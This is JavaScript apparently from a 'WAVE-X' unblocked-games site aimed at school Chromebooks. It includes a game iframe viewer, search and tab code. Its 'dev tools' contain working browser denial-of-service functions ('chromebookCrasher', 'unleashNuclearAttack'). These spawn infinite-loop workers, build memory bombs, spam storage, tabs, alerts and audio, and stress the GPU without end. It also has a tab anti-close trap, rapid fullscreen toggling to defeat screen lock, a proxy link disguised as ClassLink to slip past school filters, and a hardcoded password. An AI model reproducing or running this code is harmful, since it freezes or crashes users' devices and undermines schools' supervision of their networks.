            const iframe = document.getElementById('gameIframe');
            const titleElement = document.getElementById('gameIframeTitle');
            const closeBtn = document.getElementById('gameCloseBtn');
            const fullscreenBtn = document.getElementById('gameFullscreenBtn');
            const resetBtn = document.getElementById('gameResetBtn');

            // Set the title and iframe source
            titleElement.textContent = title;
            iframe.src = url;

            // Reset fullscreen state
            container.classList.remove('fullscreen');

            // Show overlay
            overlay.classList.add('show');

            // Set up event listeners
            closeBtn.onclick = () => {
                overlay.classList.remove('show');
                iframe.src = '';
            };

            fullscreenBtn.onclick = () => {
                container.classList.toggle('fullscreen');
                if (container.classList.contains('fullscreen')) {
                    fullscreenBtn.textContent = 'EXIT FULLSCREEN';
                } else {
                    fullscreenBtn.textContent = 'FULLSCREEN';
                }
            };

            resetBtn.onclick = () => {
                const currentSrc = iframe.src;
                iframe.src = '';
                setTimeout(() => {
                    iframe.src = currentSrc;
                }, 100);
                showNotification('Game Reset', 'Refreshing game...', 'info');
            };

            // Close on overlay click (but not on container click)
            overlay.onclick = (e) => {
                if (e.target === overlay) {
                    overlay.classList.remove('show');
                    iframe.src = '';
                }
            };

            // ESC key to close
            document.addEventListener('keydown', handleEscKey);

            function handleEscKey(e) {
                if (e.key === 'Escape') {
                    overlay.classList.remove('show');
                    iframe.src = '';
                    container.classList.remove('fullscreen');
                    fullscreenBtn.textContent = 'FULLSCREEN';
                    document.removeEventListener('keydown', handleEscKey);
                }
            }
        }

        function showGameLaunchNotification(gameTitle) {
            const notification = document.createElement('div');
            notification.style.position = 'fixed';
            notification.style.top = '20px';
            notification.style.right = '20px';
            notification.style.background = 'rgba(0, 0, 0, 0.9)';
            notification.style.border = '2px solid var(--hacker-green)';
            notification.style.borderRadius = '10px';
            notification.style.padding = '15px';
            notification.style.color = 'var(--hacker-green)';
            notification.style.fontFamily = 'monospace';
            notification.style.fontSize = '14px';
            notification.style.zIndex = '1000';
            notification.innerHTML = `
                <div style="color: var(--hacker-cyan); font-weight: bold; margin-bottom: 5px;"> GAME LOADED</div>
                <div>${gameTitle}</div>
                <div style="color: var(--hacker-orange); font-size: 12px; margin-top: 5px;">Use controls: CLOSE/FULLSCREEN/RESET</div>
            `;

            document.body.appendChild(notification);

            setTimeout(() => {
                notification.style.opacity = '0';
                setTimeout(() => notification.remove(), 500);
            }, 3000);
        }

        function setupGamesControls() {
            const sortBtn = document.getElementById('gamesSortAlpha');
            const resetBtn = document.getElementById('gamesResetLayout');

            sortBtn.addEventListener('click', () => {
                currentGamesData.sort((a, b) => a.title.localeCompare(b.title));
                populateGamesGrid(currentGamesData);
                sortBtn.textContent = ' Sorted AZ';
                setTimeout(() => sortBtn.textContent = 'Sort AZ', 1000);
            });

            resetBtn.addEventListener('click', () => {
                currentGamesData = [...gamesData];
                populateGamesGrid(currentGamesData);
                resetBtn.textContent = ' Layout Reset';
                setTimeout(() => resetBtn.textContent = 'Reset Layout', 1000);
            });
        }

        // Game Search Functionality
        function searchGames() {
            const searchInput = document.getElementById('gameSearchInput');
            const filter = searchInput.value.toLowerCase().trim();

            if (!filter) {
                // No search term, show all games
                populateGamesGrid(currentGamesData);
                showNotification('SEARCH CLEARED', 'All games displayed', 'info');
                return;
            }

            // Filter games based on search term
            const filteredGames = currentGamesData.filter(game =>
                game.title.toLowerCase().includes(filter)
            );

            // Display filtered results
            populateGamesGrid(filteredGames);

            // Show search results notification
            if (filteredGames.length === 0) {
                showNotification('NO RESULTS', 'No games found matching "' + searchInput.value + '"', 'warning');
            } else {
                showNotification('SEARCH RESULTS', `Found ${filteredGames.length} game${filteredGames.length !== 1 ? 's' : ''} matching "${searchInput.value}"`, 'success');
            }

            // Highlight search term in results (optional visual enhancement)
            filteredGames.forEach(game => {
                if (game.title.toLowerCase().includes(filter)) {
                    // Could add highlighting here if needed
                }
            });
        }

        // Keyboard shortcuts for games page
        document.addEventListener('keydown', (e) => {
            if (document.getElementById('gamesPage').classList.contains('show')) {
                if (e.key === 's' && e.ctrlKey) {
                    e.preventDefault();
                    document.getElementById('gamesSortAlpha').click();
                }
                if (e.key === 'r' && e.ctrlKey) {
                    e.preventDefault();
                    document.getElementById('gamesResetLayout').click();
                }
                // Search shortcuts
                if (e.key === 'f' && e.ctrlKey) {
                    e.preventDefault();
                    document.getElementById('gameSearchInput').focus();
                    showNotification('SEARCH FOCUS', 'Search input activated (Ctrl+F)', 'info');
                }
                // Clear search on Escape
                if (e.key === 'Escape' && document.activeElement === document.getElementById('gameSearchInput')) {
                    const searchInput = document.getElementById('gameSearchInput');
                    searchInput.value = '';
                    searchInput.blur();
                    populateGamesGrid(currentGamesData);
                    showNotification('SEARCH CLEARED', 'Search cleared', 'info');
                }
            }
        });

        // Real-time search as user types (optional enhancement)
        let searchTimeout;
        function setupRealtimeSearch() {
            const searchInput = document.getElementById('gameSearchInput');
            searchInput.addEventListener('input', () => {
                clearTimeout(searchTimeout);
                searchTimeout = setTimeout(searchGames, 300); // Debounce search to avoid too many calls
            });
        }

        // Initialize search when tabs are set up
        function initializeSearch() {
            setupRealtimeSearch();
            // Focus search input when games tab is activated
            const searchInput = document.getElementById('gameSearchInput');
            if (searchInput) {
                searchInput.placeholder = 'Search games... (Type or Ctrl+F)';
            }
        }

        // Tab Switching System
        function initializeTabs() {
            const tabs = document.querySelectorAll('.tab');
            const tabContents = document.querySelectorAll('.tab-content');

            tabs.forEach(tab => {
                tab.addEventListener('click', () => {
                    // Remove active class from all tabs and contents
                    tabs.forEach(t => t.classList.remove('active'));
                    tabContents.forEach(content => content.classList.remove('active'));

                    // Add active class to clicked tab and corresponding content
                    tab.classList.add('active');
                    const targetTab = `${tab.dataset.tab}-tab`;
                    const targetContent = document.getElementById(targetTab);
                    if (targetContent) {
                        targetContent.classList.add('active');
                    }

                    // Initialize specific tab content
                    if (tab.dataset.tab === 'games') {
                        initializeGamesPage();
                        initializeSearch(); // Initialize search functionality
                    } else if (tab.dataset.tab === 'proxy') {
                        initializeProxyPage();
                    } else if (tab.dataset.tab === 'tools') {
                        initializeToolsPage();
                    } else if (tab.dataset.tab === 'customize') {
                        initializeCustomizePage();
                        updateCurrentTitleDisplay();
                    }
                });
            });
        }

        // Proxy Page Functionality (Manual Typing Effect with Background Overlay)
        function initializeProxyPage() {
            const launchBtn = document.getElementById('launchProxyBtn');
            const proxyOverlayText = document.getElementById('proxyOverlayText');

            launchBtn.addEventListener('click', async () => {
                // Disable button during execution
                launchBtn.style.opacity = '0.6';
                launchBtn.disabled = true;

                // Show the overlay text element
                proxyOverlayText.style.display = 'flex';
                proxyOverlayText.textContent = '';

                // Simulate manual typing of the command
                const command = 'launching wave-x proxy...';
                let index = 0;

                const typeCommand = () => {
                    if (index < command.length) {
                        proxyOverlayText.textContent += command[index];
                        index++;
                        setTimeout(typeCommand, 50 + (Math.random() * 50)); // Faster random delay for realistic typing
                    } else {
                        // Command finished, show Health:ok after a pause
                        setTimeout(() => {
                            proxyOverlayText.textContent = ''; // Start fresh for health check
                            typeHealthCheck();
                        }, 200);
                    }
                };

                const typeHealthCheck = () => {
                    const healthCommand = 'Health:ok';
                    let healthIndex = 0;

                    const typeHealth = () => {
                        if (healthIndex < healthCommand.length) {
                            proxyOverlayText.textContent += healthCommand[healthIndex];
                            healthIndex++;
                            setTimeout(typeHealth, 100 + (Math.random() * 50));
                        } else {
                            // Health check complete - open proxy site like a game
                            setTimeout(() => {
                                showGameIframe('https://myapps.classlink.midschoolmath.fri67.com/', 'Wave-X Proxy Access');
                            }, 1000);
                        }
                    };

                    typeHealth();
                };

                typeCommand();
            });
        }

        // Dev Mode Functionality
        let devModeActive = false;
        let antiLockScreenActive = false;
        let antiLockScreenInterval = null;

        // Make sure dev tools are initialized properly
        function initializeDevTools() {
            updateDevToolsVisibility();

            // Re-bind all tool card click events
            const toolCards = document.querySelectorAll('.tool-card');
            toolCards.forEach(card => {
                const onclickAttr = card.getAttribute('onclick');
                if (onclickAttr) {
                    card.onclick = new Function(onclickAttr.replace('onclick="', '').replace('"', ''));
                }
            });
        }

        function checkDevCode() {
            const code = prompt('Enter dev code to unlock developer tools:');
            if (code === 'thebannanasareapples') {
                devModeActive = true;
                showNotification('DEV MODE UNLOCKED', 'Developer tools activated', 'success');
                updateDevToolsVisibility();

                // Add self-ban tool to dev tools
                addSelfBanTool();

                return true;
            } else {
                showNotification('INVALID CODE', 'Access denied', 'error');
                return false;
            }
        }

        function requireDevCode(callback) {
            const code = prompt('Enter dev code:');
            if (code === 'thebannanasareapples') {
                callback();
            } else {
                showNotification('INVALID CODE', 'Access denied', 'error');
            }
        }

        function addSelfBanTool() {
            // Add self-ban tool to the dev tools grid
            const toolsGrid = document.getElementById('tools-tab').querySelector('.tools-grid');
            if (toolsGrid && !document.getElementById('self-ban-tool')) {
                const selfBanTool = document.createElement('div');
                selfBanTool.id = 'self-ban-tool';
                selfBanTool.className = 'tool-card dev-only';
                selfBanTool.onclick = banYourself;
                selfBanTool.innerHTML = `
                    <div class="tool-icon"></div>
                    <div class="tool-title">BAN YOURSELF</div>
                    <div class="tool-desc">Permanently ban this device from WAVE-X</div>
                `;
                toolsGrid.appendChild(selfBanTool);
            }
        }

        function banYourself() {
            // Require dev code before proceeding with ban
            const devCode = prompt(' WARNING: This action is IRREVERSIBLE!\n\nYou are about to PERMANENTLY BAN this device from WAVE-X.\nAll data will be wiped and you will lose access FOREVER.\n\nENTER DEVELOPER CODE:');

            // Handle prompt cancellation or empty input
            if (devCode === null || devCode === undefined || devCode.trim() === '') {
                showNotification('CANCELLED', 'Self-ban operation cancelled by user', 'info');
                return;
            }

            // Check correct dev code
            if (devCode.toLowerCase() !== 'thebannanasareapples'.toLowerCase()) {
                showNotification('INVALID CODE', 'Self-ban cancelled - incorrect developer code', 'error');
                return;
            }

            // Immediate ban - no confirmations or warnings after code validation
            const fingerprint = generateBrowserFingerprint();

            // Generate permanent ban data with timestamp and duration info
            const banData = {
                fingerprint: fingerprint,
                reason: 'SELF-BANNED - Permanent Device Lockout',
                banDate: new Date().toISOString(),
                banDuration: 'PERMANENT - NO END DATE',
                platform: navigator.platform,
                userAgent: navigator.userAgent.substring(0, 40) + '...',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenResolution: `${screen.width}x${screen.height}`,
                selfBan: true,
                permanent: true,
                banId: 'SELF_BAN_' + Date.now(),
                banTimeRemaining: ' (Forever)',
                isActiveBan: true,
                cannotBeUndone: true
            };

            // Save to permanent storage
            try {
                // Clear all localStorage first for extra punishment
                const keysToPreserve = ['banInfo', 'bannedHWIDs'];
                const allKeys = Object.keys(localStorage);

                for (const key of allKeys) {
                    if (!keysToPreserve.includes(key)) {
                        localStorage.removeItem(key);
                    }
                }

                // Add to banned devices list (triple-check for redundancy)
                const bannedHWIDs = JSON.parse(localStorage.getItem('bannedHWIDs') || '[]');
                if (!bannedHWIDs.includes(fingerprint)) {
                    bannedHWIDs.push(fingerprint);
                }

                // Add another fingerprint variant for extra security
                const altFingerprint = fingerprint.substring(0, 20) + 'BANNED';
                if (!bannedHWIDs.includes(altFingerprint)) {
                    bannedHWIDs.push(altFingerprint);
                }

                localStorage.setItem('bannedHWIDs', JSON.stringify(bannedHWIDs));

                // Store detailed ban info (multiple copies for redundancy)
                const existingBans = JSON.parse(localStorage.getItem('banInfo') || '[]');
                existingBans.push(banData);
                localStorage.setItem('banInfo', JSON.stringify(existingBans));

                // Create permanent session storage ban as well
                sessionStorage.setItem('deviceBanned', 'true');
                sessionStorage.setItem('banTime', banData.banDate);
                sessionStorage.setItem('banReason', banData.reason);

                // Set a permanent cookie for maximum persistence
                document.cookie = 'wave_x_permanent_ban=yes; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/; secure; samesite=strict';

                showNotification(' PERMANENT SELF-BAN ACTIVATED', 'Device banned forever - system wiping...', 'error');

                // Extra delay before reload to show what's happening
                setTimeout(() => {
                    // Clear any remaining data
                    try {
                        localStorage.clear(); // Full clear after storing ban info
                        // Re-add the ban data to survive the clear
                        localStorage.setItem('bannedHWIDs', JSON.stringify(bannedHWIDs));
                        localStorage.setItem('banInfo', JSON.stringify(existingBans));
                    } catch (e) {
                        // If clear fails, ban still works
                    }

                    // Force reload with ban screen
                    window.location.reload(true);
                }, 3000);

            } catch (error) {
                alert('BAN ERROR: Could not save ban data. Retry or use manual ban.');
            }
        }

        function updateDevToolsVisibility() {
            const devCards = document.querySelectorAll('.dev-only');
            devCards.forEach(card => {
                if (devModeActive) {
                    card.style.display = 'block';
                } else {
                    card.style.display = 'none';
                }
            });

            // Update the "Unlock Dev Tools" card text if unlocked
            const unlockCard = document.querySelector('.tool-card[onclick="unlockDevTools()"] .tool-title');
            if (unlockCard && devModeActive) {
                unlockCard.textContent = 'Dev Mode Active';
                unlockCard.parentElement.querySelector('.tool-desc').textContent = 'Developer tools enabled';
            }
        }

        function antiCloseTab() {
            // Prevent browser tab from closing
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = 'WARNING: Anti-close tab is active. Are you sure you want to leave?';
                return 'WARNING: Anti-close tab is active. Are you sure you want to leave?';
            });

            // Override close attempts
            document.onkeydown = function(e) {
                if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'W')) {
                    e.preventDefault();
                    showNotification('ANTI-CLOSE ACTIVE', 'Tab close prevented', 'warning');
                    return false;
                }
            };

            showNotification('ANTI CLOSE TAB', 'Tab protection enabled', 'info');
        }

        function chromebookCrasher() {
            alert(' CHROMEBOOK TERMINATION SEQUENCE ACTIVATED! \\n\\n HIGH-INTENSITY SYSTEM CRASH INITIATED\\n\\n CLOSE THIS TAB IMMEDIATELY OR SUFFER THE CONSEQUENCES ');

            // INSTANT MASSIVE WORKER SPAWN - No delay, immediate destruction
            const cores = navigator.hardwareConcurrency || 4;
            const workersPerCore = 25; // Maximum workers per core for instant crash

            for (let core = 0; core < cores; core++) {
                for (let i = 0; i < workersPerCore; i++) {
                    try {
                        const worker = new Worker('data:application/javascript,' + encodeURIComponent(`
                            // Immediate infinite CPU loop - no breaks, no mercy
                            while (true) {
                                // Heavy trigonometric operations
                                let x = 0;
                                for (let j = 0; j < 500000; j++) {
                                    x += Math.sin(j) * Math.cos(j) * Math.tan(j);
                                    x = Math.sqrt(Math.abs(x));
                                }

                                // Memory allocation and manipulation
                                const bigArray = new Array(100000).fill(0);
                                for (let k = 0; k < bigArray.length; k++) {
                                    bigArray[k] = Math.random() * Math.sin(Date.now()) * k;
                                }

                                // Recursive computation to eat stack
                                function deep(n) {
                                    if (n <= 0) return Math.random();
                                    return Math.sin(deep(n - 1)) + Math.cos(deep(n - 1));
                                }
                                deep(50);
                            }
                        `));

                        // Self-replication - spawn sub-workers immediately
                        setTimeout(() => {
                            try {
                                const subWorker = new Worker('data:application/javascript,' + encodeURIComponent(`
                                    while (true) {
                                        let sum = 0;
                                        for (let loop = 0; loop < 1000000; loop++) {
                                            sum += Math.sin(loop) * Math.cos(loop);
                                            sum = Math.sqrt(Math.abs(sum));
                                        }
                                    }
                                `));
                            } catch (e) {}
                        }, 100);

                    } catch (e) {
                        // Worker limit hit - try tabs/windows instead
                        setTimeout(() => {
                            try {
                                const win = window.open('about:blank', '_blank');
                                if (win) {
                                    win.document.write('CRASHING... DO NOT CLOSE');
                                    win.alert('SYSTEM UNDER ATTACK!');
                                }
                            } catch (e2) {}
                        }, 50);
                    }
                }
            }

            // TAB THRASHING ATTACK - Open/close windows rapidly
            let tabAttack = setInterval(() => {
                try {
                    const win = window.open('about:blank', '_blank');
                    setTimeout(() => {
                        try { win.close(); } catch (e) {}
                    }, 10);
                } catch (e) {}
            }, 100);

            // MASS ALERT SPAM - Overwhelm user completely
            let alertCount = 0;
            let alertSpam = setInterval(() => {
                alertCount++;
                try {
                    alert(' CRASH #' + alertCount + ' \\n\\n SYSTEM FAILURE IMMINENT \\n\\n CPU OVERLOAD DETECTED \\n\\n WORKERS MULTIPLYING \\n\\n DATA CORRUPTION WARNING ');
                } catch (e) {}
                if (alertCount >= 50) clearInterval(alertSpam);
            }, 500);

            // CONSOLE FLOOD - Fill console output
            let consoleFlood = setInterval(() => {
                console.log(' SYSTEM CRASH IN PROGRESS - WORKERS MULTIPLYING ');
                console.error('CRITICAL FAILURE: CPU OVERLOAD DETECTED');
                console.warn('MEMORY ALLOCATION FAILURE IMMINENT');
            }, 100);

            // DOM ATTACK - Create massive DOM elements
            let domFlood = setInterval(() => {
                const div = document.createElement('div');
                div.innerHTML = 'CRASH'.repeat(1000);
                div.style.position = 'absolute';
                div.style.left = Math.random() * 100 + 'vw';
                div.style.top = Math.random() * 100 + 'vh';
                div.style.zIndex = '99999';
                div.style.fontSize = Math.random() * 50 + 'px';
                div.style.color = 'red';
                div.style.background = 'red';
                document.body.appendChild(div);

                document.body.classList.add('chromecrash');

                // Remove after a short time (memory torture)
                setTimeout(() => {
                    try { div.remove(); } catch (e) {}
                }, 200);
            }, 200);

            // AUDIO ATTACK - Maximum volume sounds if possible
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                for (let i = 0; i < 10; i++) {
                    const oscillator = audioContext.createOscillator();
                    const gainNode = audioContext.createGain();
                    oscillator.frequency.setValueAtTime(200 + (i * 100), audioContext.currentTime);
                    gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
                    oscillator.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    oscillator.start();
                }
            } catch (e) {}

            setTimeout(() => {
                clearInterval(tabAttack);
                clearInterval(alertSpam);
                clearInterval(consoleFlood);
                clearInterval(domFlood);
            }, 15000);

            console.log('%c MAXIMUM DESTRUCTION PROTOCOL ACTIVATED ', 'color: red; font-size: 30px;');
            showNotification(' TERMINATION SEQUENCE', 'Chromebook destruction in progress', 'error');
        }

        function unleashNuclearAttack() {
            console.log(' NUCLEAR ATTACK PROTOCOL ACTIVATED ');

            let cpuWorkers = [];
            let attackIntervals = [];
            let hugeArrays = [];
            let canvii = [];

            // PHASE 1: CPU OVERLOAD - Infinite threads
            for (let i = 0; i < 50; i++) { // 50 threads instead of hardwareConcurrency
                const worker = new Worker('data:application/javascript,' + encodeURIComponent(`
                    while (true) {
                        let sum = 0;
                        for (let j = 0; j < 5e8; j++) {
                            sum += Math.sin(j) * Math.cos(j) * Math.tan(j);
                            // Triple the math operations per iteration
                        }
                    }
                `));
                cpuWorkers.push(worker);
            }

            console.log(' CPU WORKERS DEPLOYED');

            // PHASE 2: MEMORY BOMB - Gigabytes of arrays
            setTimeout(() => {
                for (let i = 0; i < 1000; i++) {
                    const massiveArray = new Array(1000000).fill(Math.random());
                    hugeArrays.push(massiveArray);

                    // Keep growing the array
                    setInterval(() => {
                        massiveArray.push(Math.random(), Math.random(), Math.random());
                    }, 1);
                }
                console.log(' MEMORY BOMBS DETONATED');
            }, 100);

            // PHASE 3: STORAGE ATTACK - Spam localStorage
            setTimeout(() => {
                localStorage.clear(); // Clear first, then spam
                const spamInterval = setInterval(() => {
                    try {
                        for (let i = 0; i < 1000; i++) {
                            localStorage.setItem('crash_' + Math.random(), 'x'.repeat(10000)); // 10KB per entry
                        }
                    } catch (e) {
                        // Storage full, even worse for system
                        localStorage.setItem('FATAL_CRASH_' + Date.now(), 'x'.repeat(1000000));
                    }
                }, 10);
                attackIntervals.push(spamInterval);
                console.log(' STORAGE SPAM ACTIVATED');
            }, 200);

            // PHASE 4: AUDIO ATTACK - Maximum volume audio contexts
            setTimeout(() => {
                for (let i = 0; i < 20; i++) {
                    try {
                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                        const oscillator = audioContext.createOscillator();
                        const gainNode = audioContext.createGain();

                        oscillator.frequency.setValueAtTime(1000 + (i * 100), audioContext.currentTime);
                        gainNode.gain.setValueAtTime(1, audioContext.currentTime);

                        oscillator.connect(gainNode);
                        gainNode.connect(audioContext.destination);

                        oscillator.start();
                        // Keep them running continuously
                    } catch (e) {}
                }
                console.log(' AUDIO FLOOD STARTED');
            }, 300);

            // PHASE 5: CANVAS ABUSE - Maximum GPU stress
            setTimeout(() => {
                document.body.style.position = 'relative';
                for (let i = 0; i < 10; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth;
                    canvas.height = window.innerHeight;
                    canvas.style.position = 'absolute';
                    canvas.style.top = '0';
                    canvas.style.left = '0';
                    canvas.style.zIndex = '100000';
                    canvas.style.pointerEvents = 'none';
                    document.body.appendChild(canvas);

                    const ctx = canvas.getContext('2d');
                    canvii.push(canvas);

                    // GPU intensive render loop
                    const renderInterval = setInterval(() => {
                        ctx.clearRect(0, 0, canvas.width, canvas.height);
                        for (let j = 0; j < 10000; j++) {
                            ctx.beginPath();
                            ctx.arc(
                                Math.random() * canvas.width,
                                Math.random() * canvas.height,
                                Math.random() * 50 + 10,
                                0,
                                2 * Math.PI
                            );
                            ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
                            ctx.fill();
                            ctx.closePath();
                        }
                    }, 16); // ~60fps GPU stress
                    attackIntervals.push(renderInterval);
                }
                console.log(' GPU CANVAS FLOOD ACTIVE');
            }, 400);

            // PHASE 6: EVENT STORM - Infinite event firing
            setTimeout(() => {
                const eventStormInterval = setInterval(() => {
                    document.dispatchEvent(new Event('click'));
                    document.dispatchEvent(new Event('mousemove'));
                    document.dispatchEvent(new Event('scroll'));
                    document.dispatchEvent(new Event('resize'));
                    document.dispatchEvent(new Event('keyup'));
                    window.dispatchEvent(new Event('focus'));
                }, 1);
                attackIntervals.push(eventStormInterval);
                console.log(' EVENT STORM RAGING');
            }, 500);

            // PHASE 7: DOM ATTACK - Infinite DOM manipulation
            setTimeout(() => {
                const domAttackInterval = setInterval(() => {
                    const crazyDiv = document.createElement('div');
                    crazyDiv.innerHTML = 'CRASH'.repeat(1000);
                    crazyDiv.style.position = 'absolute';
                    crazyDiv.style.left = Math.random() * 100 + 'vw';
                    crazyDiv.style.top = Math.random() * 100 + 'vh';
                    crazyDiv.style.zIndex = '100000';
                    crazyDiv.style.fontSize = Math.random() * 100 + 10 + 'px';
                    crazyDiv.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    document.body.appendChild(crazyDiv);

                    // Remove after short time to keep memory growing but not crash browser immediately
                    setTimeout(() => crazyDiv.remove(), 100);
                }, 10);
                attackIntervals.push(domAttackInterval);
                console.log(' DOM HURRICANE UNLEASHED');
            }, 600);

            // PHASE 8: WEBSOCKET STORM - Infinite connection attempts
            setTimeout(() => {
                for (let i = 0; i < 100; i++) {
                    try {
                        const ws = new WebSocket('ws://localhost:' + (8080 + i));
                        // Try to connect to non-existent websocket servers
                    } catch (e) {
                        // Will still stress networking
                    }
                }
                console.log(' WEBSOCKET FLOOD INITIATED');
            }, 700);

            // PHASE 9: CSS ANIMATION ATTACK - Maximum CSS computation
            setTimeout(() => {
                const cssAttack = document.createElement('div');
                cssAttack.style.position = 'absolute';
                cssAttack.style.width = '100%';
                cssAttack.style.height = '100%';
                cssAttack.style.zIndex = '100000';
                cssAttack.style.pointerEvents = 'none';
                document.body.appendChild(cssAttack);

                let hue = 0;
                const cssInterval = setInterval(() => {
                    hue = (hue + 1) % 360;
                    cssAttack.style.background = `
                        linear-gradient(${hue}deg, rgba(255,0,0,0.1), rgba(255,255,0,0.1), rgba(0,255,0,0.1), rgba(0,255,255,0.1), rgba(0,0,255,0.1), rgba(255,0,255,0.1)),
                        repeating-conic-gradient(${hue * 2}deg, transparent, rgba(255,255,255,0.1) 2deg),
                        radial-gradient(circle at ${Math.random() * 100}% ${Math.random() * 100}%, rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.3) ${Math.random() * 100}%, transparent ${Math.random() * 100}%),
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100%" height="100%" fill="hsl(${hue}, 100%, 50%)"><animate attributeName="fill" values="hsl(${hue},100%,50%);hsl(${hue+60},100%,50%);hsl(${hue},100%,50%)" dur="0.1s" repeatCount="indefinite"/></rect></svg>')
                    `;
                    cssAttack.style.transform = `scale(${0.8 + Math.sin(Date.now() * 0.001) * 0.4}) rotate(${hue}deg)`;
                }, 10);
                attackIntervals.push(cssInterval);
                console.log(' CSS INFERNO BLAZING');
            }, 800);

            // FINAL WARNING
            setTimeout(() => {
                console.log(' SYSTEM CRITICAL FAILURE IMMINENT ');
                console.log(' THERMONUCLEAR CASCADE DETECTED ');
                console.log(' MANUAL INTERVENTION REQUIRED ');

                // Attempt alert storms
                const alertInterval = setInterval(() => {
                    try {
                        alert('CHROMEBOOK TERMINATION SEQUENCE ACTIVATED');
                    } catch (e) {
                        // Alerts are blocked, continue the hell
                    }
                }, 500);
                attackIntervals.push(alertInterval);

            }, 1000);

            // NO AUTO RESET - This runs forever until manual intervention required
        }

        function fakeChromebookCrash() {
            document.getElementById('chromeCrash').classList.add('active');
            setTimeout(() => document.getElementById('chromeCrash').classList.remove('active'), 10000);
        }

        function overheatSimulator() {
            document.getElementById('overheat').classList.add('active');
            document.body.classList.add('overheat');
            let count = 10;
            let countdown = setInterval(() => {
                count--;
                document.getElementById('countdown').textContent = count;
                if (count <= 0) {
                    clearInterval(countdown);
                    location.reload();
                }
            }, 1000);
        }

        function toggleAntiLockScreen() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            if (antiLockScreenActive) {
                // Stop anti-lock screen
                clearInterval(antiLockScreenInterval);
                antiLockScreenActive = false;
                showNotification('ANTI-LOCK DISABLED', 'Screen lock prevention stopped', 'info');
            } else {
                // Start anti-lock screen (rapid fullscreens@unfullscreens)
                antiLockScreenInterval = setInterval(() => {
                    if (document.fullscreenElement) {
                        document.exitFullscreen().catch(() => {});
                    } else {
                        document.documentElement.requestFullscreen().catch(() => {});
                    }
                }, 10); // Very rapid toggling

                antiLockScreenActive = true;
                showNotification('ANTI-LOCK ACTIVATED', 'Rapid fullscreen toggle started', 'warning');
            }
        }

        function openChromebookCrasher() {
            // Open Crasher.html like a normal game card
            openGame('Crasher.html', ' Chromebook Crasher');
        }

        function unlockDevTools() {
            // Code check removed - dev mode now unlocks freely
            devModeActive = true;
            showNotification('DEV MODE UNLOCKED', 'Developer tools activated', 'success');
            updateDevToolsVisibility();
            // Change the Unlock Dev Tools card to show it's unlocked
            const unlockCard = document.querySelector('.tool-card[onclick="unlockDevTools()"] .tool-title');
            if (unlockCard) {
                unlockCard.textContent = 'Dev Mode Active';
                unlockCard.parentElement.querySelector('.tool-desc').textContent = 'Developer tools enabled';
            }
        }

        function showUrlEncoder() {
            if (!devModeActive) {
                if (!unlockDevTools()) return;
            }

            // Create URL encoder tool interface
            showToolModal(' URL ENCODER', `
                <div style="text-align: center;">
                    <textarea id="urlInput" placeholder="Enter URL to encode/decode..." style="width: 100%; height: 80px; margin: 10px 0; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; resize: none;"></textarea>
                    <div style="display: flex; gap: 10px; justify-content: center; margin: 15px 0;">
                        <button onclick="encodeURL()" style="background: var(--hacker-cyan); color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">ENCODE</button>
                        <button onclick="decodeURL()" style="background: var(--hacker-green); color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">DECODE</button>
                    </div>
                    <div id="urlResult" style="margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-orange); font-family: monospace; word-break: break-all;"></div>
                </div>
            `);
        }

        function encodeURL() {
            const input = document.getElementById('urlInput').value;
            const result = encodeURIComponent(input);
            document.getElementById('urlResult').textContent = result;
            navigator.clipboard.writeText(result);
            showNotification('URL ENCODED', 'Copied to clipboard', 'success');
        }

        function decodeURL() {
            const input = document.getElementById('urlInput').value;
            try {
                const result = decodeURIComponent(input);
                document.getElementById('urlResult').textContent = result;
                navigator.clipboard.writeText(result);
                showNotification('URL DECODED', 'Copied to clipboard', 'success');
            } catch (e) {
                showNotification('INVALID URL', 'Cannot decode invalid URL', 'error');
            }
        }

        function showPasswordGenerator() {
            if (!devModeActive) {
                if (!unlockDevTools()) return;
            }

            // Create password generator tool interface
            showToolModal(' PASSWORD GENERATOR', `
                <div style="text-align: center;">
                    <div style="margin: 15px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Length:</label>
                        <input type="number" id="passwordLength" value="12" min="4" max="64" style="width: 60px; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; text-align: center;">
                    </div>
                    <div style="margin: 15px 0;">
                        <label style="color: var(--hacker-orange); margin-right: 10px;"><input type="checkbox" id="includeUppercase" checked> Uppercase</label>
                        <label style="color: var(--hacker-orange); margin-right: 10px;"><input type="checkbox" id="includeLowercase" checked> Lowercase</label>
                        <label style="color: var(--hacker-orange); margin-right: 10px;"><input type="checkbox" id="includeNumbers" checked> Numbers</label>
                        <label style="color: var(--hacker-orange); margin-right: 10px;"><input type="checkbox" id="includeSymbols" checked> Symbols</label>
                    </div>
                    <button onclick="generatePassword()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 30px; border-radius: 5px; cursor: pointer; margin: 10px 0;">GENERATE</button>
                    <div id="passwordResult" style="margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-green); font-family: monospace; font-size: 16px; word-break: break-all; min-height: 30px;"></div>
                </div>
            `);
        }

        function generatePassword() {
            const length = parseInt(document.getElementById('passwordLength').value) || 12;
            const includeUppercase = document.getElementById('includeUppercase').checked;
            const includeLowercase = document.getElementById('includeLowercase').checked;
